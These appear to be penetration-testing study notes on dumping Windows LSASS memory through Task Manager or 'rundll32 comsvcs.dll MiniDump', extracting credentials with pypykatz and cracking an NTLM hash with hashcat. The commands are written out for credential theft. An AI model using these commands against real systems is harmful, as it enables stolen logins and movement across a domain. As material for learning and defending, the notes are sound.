# Attacking LSASS

Upon initial logon, LSASS will:

* Cache credentials locally in memory
* Create access tokens
* Enforce security policies
* Write to Windows security log

## Dumping LSASS Process Memory

Here we dump memory like SAM first then utilize it with pypykatz

### Task Manager method

**Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file**

![[images/image 5.png]]

A file called lsass.DMP is created and saved in:

```powershell
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

then we will transfer that file to our attack host (kali)

### Rundll32.exe & Comsvcs.dll Method

useful when we have shell

**First thing,** get process ID (`PID`) is assigned to `lsass.exe`

#### Finding LSASS PID in CMD

```
tasklist /svc
```

![[images/image 6.png]]

#### Finding LSASS PID in PowerShell

```powershell
Get-Process lsass
```

![[images/image 7.png]]

**After getting PID, we can make dump file**

#### **Creating lsass.dmp using PowerShell**


```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

## Using Pypykatz to Extract Credentials

LSASS is a subsystem of `local security authority (LSA)`

```bash
pypykatz lsa minidump /path/to/lsass.dmp
```


> [!NOTE]
> While doing transfer you will get network error. *just* have faith it's fine
> 

it will generate massive output


![[images/image 8.png]]
### MSV

authentication package in Windows that LSA calls on to validate logon attempts against the SAM database

### WDIGEST

older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`

LSASS caches credentials used by WDIGEST in clear-text

### Kerberos

LSASS `caches passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain

### DAPI

Mimikatz and Pypykatz can extract the DPAPI `masterkey` for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts

## Then simple, use hashcat

```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b rockyou.txt
```
